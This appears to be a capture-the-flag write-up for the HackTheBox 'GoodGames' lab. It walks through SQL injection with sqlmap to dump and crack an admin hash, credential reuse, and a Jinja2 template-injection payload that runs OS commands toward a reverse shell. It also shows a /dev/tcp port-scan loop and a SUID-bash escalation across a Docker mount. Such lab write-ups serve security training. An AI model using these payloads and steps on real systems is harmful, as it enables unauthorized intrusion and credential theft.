# NMAP 
```shell 
nmap -sC -sV -oA nmap/gg $IP --min-rate=1000 -T5

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-26 08:31 CDT
Nmap scan report for 10.129.231.152
Host is up (0.15s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.51
|_http-title: GoodGames | Community and Store
Service Info: Host: goodgames.htb

```

# PORTS 
80 -> Possible SQL Injection on login/registration form


> executed sqlmap to enumerate db
```
sqlmap -a -u http://goodgames.htb --cookie "<>" --forms -crawl=2
```

> -a enumerate all
> -u url
> --cookie to set authentication tokens
> --forms enumerate all forms 

> The enumeration took so long, I tried a new approach, first I enumerated all databases, I downloaded the request from burp
> to specify injectable form

`sqlmap -r form.req --dbs`

> database-> `main`

`sqlmap -r form.req -D main --tables`

> tables -> user

`sqlmap -r form.req -D main -T user --dump`

> found admin credentials

```
username: admin@goodgames.htb
password: 2b22337f218b2d82dfc3b6f77e7cb8ec
```

> the password was hashed using md5, I used hashcat to crack the password

```shell
hashcat -m 0 -a 0 hash.txt rockyou
# after the first command is done
hashcat -m 0 -a 0 hash.txt rockyou --show
```

>password: superadministrator
>after logging in, the site redirects to a subdomain on where I used the same credentials and it still works 
>
>**admin:superadministrator**


> Settings page has an edit form that displays user information, it has an SSTI vulnerability 
> 
> [SSTI-HACKTRICKS](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti) 

```python
{{request.application.__globals__.__builtins__.__import__('os').popen('<revshell_command>').read()}}
```

> I used this payload that remotely execute a command to execute a reverse shell 
[SSTI-REVERSE-SHELL](https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/)  

```shell
for i in {1..65535}; do (echo > /dev/tcp/172.19.0.2/$i) >/dev/null 2>&1 && echo $i is open; done
```
>executed a port scanner to check for other machines running in the docker network/outside the network

> I got stuck and had to look at the official writeup, found out that 172.19.0.1 is the main machine that hosts the docker 
> 
> ssh'd on to the machine using the credentials augustus:superadministrator

`ssh augustus@172.19.0.1`
`password: superadministrator`

> got a shell access, had to look at the writeup again as I was stuck escalating privileges
> 
> since the directory of the augustus is mounted in the docker machine and the user that we have on the docker machine is root user, we need to move any command on /home/augustus directory and make it a SUID file using the docker machine, for this instance 
> I copied the 'bash' binary to /home/augustus, switched back to docker and changes the permission and owner of the `bash` binary

 ```shell
 cp /bin/bash /home/augustus
 chmod 4755 bash
 chown root:root bash
 # in augustus machine
 ./bash -p
```
 
 